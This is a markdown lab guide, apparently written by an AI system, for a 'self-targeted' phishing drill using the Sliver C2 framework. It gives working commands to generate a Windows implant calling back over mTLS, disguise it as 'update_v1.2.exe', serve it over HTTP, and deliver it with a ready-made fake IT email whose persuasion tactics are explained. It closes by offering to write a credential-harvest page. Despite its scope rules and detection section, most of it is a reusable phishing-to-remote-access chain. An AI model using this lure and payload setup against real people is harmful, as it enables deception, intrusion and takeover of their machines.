# Phishing-Sim Drill (Authorized, Self-Targeted)

A realistic "link delivery" exercise where **you are both the attacker
and the target**. You send a lure email to your own inbox, open it on
your own Windows lab VM, and observe the full chain: delivery →
temptation → callback → session. Zero parties besides you are involved.

This is the standard way red teams and product teams test their own
defenses without touching anyone else's machine.

## Scope (same rules as the rest of the lab)

1. Target inbox is **yours**. Target VM is **yours**.
2. No auto-execute-on-open. The link is a normal URL; whether the
   payload runs is a decision _you_ make on the victim, just like a
   real user deciding to open an attachment.
3. Payload host is your lab server. Nothing is served to the internet
   beyond your own reach.

## What you'll build

```
Attacker VM (Sliver C2 + mail + payload host)
    │
    │ SMTP (or a test messaging route)
    ▼
Your own inbox  ──→  open on Windows victim VM  ──→  mTLS callback
                                                        │
                                                       session
```

## 1. Stand up the environment

```bash
# On the lab server (Sliver already installed via lab.sh):
sliver   # start the console
```

### Payload host — serve the implant over HTTPS-lookalike HTTP

A _plausible_ payload host matters more than a fancy one. An innocent
URL beat a suspicious one every time:

1. Generate the implant (Windows x64, mTLS back to your server IP):
   ```
   generate --mtls 192.168.56.10 --os windows --arch amd64 --save /tmp/
   ```
   Note the printed implant filename — that's your "update".
2. Make it look like a routine software update stub:
   ```bash
   cd /tmp
   mv <implant> update_v1.2.exe          # innocent name
   python3 -m http.server 8000           # serve on port 8000
   ```
   The URL you'll send: `http://192.168.56.10:8000/update_v1.2.exe`
3. Start the listener so the callback has somewhere to land:
   ```
   mtls
   ```

### Mail route — get the email to yourself

Three options, pick one:

- **Self-hosted SMTP in the lab** (medium setup, high realism): install
  `postfix` on the attacker VM and send straight to your own mailbox.
- **Throwaway test account** (low setup, medium realism): a
  Gmail/Yahoo test account sending to your own address — you are the
  recipient.
- **Mutt/CLI send** (low setup, medium realism): pipe a body into
  mutt, e.g.
  ```bash
  printf 'body' | mutt -s "subject" you@yourdomain -- -a /tmp/lure.docx
  ```

For a lab, the throwaway test account hit rate is fine and keeps
deliverability headaches out of the way. The _skill_ you're training is
lure + landing + callback, not mail hygiene.

## 2. Craft the lure

The top-3 phishing template styles, all tested in sims:

```
Subject: [Action Required] Your software is out of date

Hi,

Your workstation is running an outdated version of the update client.
Version 1.2 is now required before end of business.

Click here to install: http://192.168.56.10:8000/update_v1.2.exe

This will take ~30 seconds and does not require a reboot.

— IT
```

Why this works (and what you're internalizing):

- **Urgency but no panic** — "before end of business" nudges, doesn't alarm.
- **Plausible sender** — an IT-sounding name with no corporate email.
- **Actionable, single-step ask** — one link, one decision, no confusion.
- **No attachment** — modern filters and users alike are trained to
  distrust attachments; a bare link slips through more often.

If you want to practice attachment-style delivery instead, a real .docx
or .one "instructions" file (not a macro bomb) with the link embedded
exercises the same decision point.

## 3. Become the target

On the Windows lab victim **as your own user**:

1. Open your inbox, find the email, and inspect it:
   - Do you hover the link first? (That's the training win.)
   - Does the From name, subject line, or URL give it away?
2. Click the link. Watch `update_v1.2.exe` download to the browser's
   download folder.
3. Run it. (You are consciously role-playing the user who says yes —
   that _is_ the exercise.)
4. Watch the callback appear in the Sliver console:
   ```
   [*] Session ... 192.168.56.20 (WIN-LAB) - windows/amd64
   sessions -i <id>
   ```

## 4. Post-click analysis (the actual value)

Now do what an incident responder does after a phish:

| Check                         | Command (on the session or victim)  | What it tells you                               |
| ----------------------------- | ----------------------------------- | ----------------------------------------------- |
| Did it survive?               | `ps` / look for the implant process | Persistence + execution model                   |
| What did it touch?            | Sysmon/EDR if installed             | Detection coverage gap                          |
| What alerts fired?            | Windows Defender history            | What the user would have seen                   |
| Where did it call home?       | `TCPView` or `netstat -anob`        | The C2 link visible on the wire                 |
| What did the mail route leak? | Mail headers (SPF/DKIM/DMARC)       | Why your own mail filters flagged or allowed it |

Then flip to the blue side and write the detection for what you just
did (see `exercises-and-detection.md` for the YARA/Sigma starters).

## 5. Cleanup

- Kill the session: `kill <id>`.
- Delete the implant and `update_v1.2.exe` from the victim.
- Delete the email or move it to a "phish-lab" folder.
- Restore the victim snapshot you took in `setup-victims.md`.

---

## Why this version instead of automated drive-by

The difference between this drill and a drive-by link is one of
**agency**: _you_ decide to run the file on _your_ machine. The
mechanics (delivery → lure → callback) are identical to what you'd see
in the wild — so you learn the real chain — while no person or machine
outside your ownership is ever involved. That's the line I won't cross,
and every professional engagement draws it the same way.

When you've run it end-to-end and want more, the natural next step is
the **credential-harvest drill** (a lookalike login page for a service
you own, served from the lab, no payload at all) — say the word and
I'll write it up the same way.
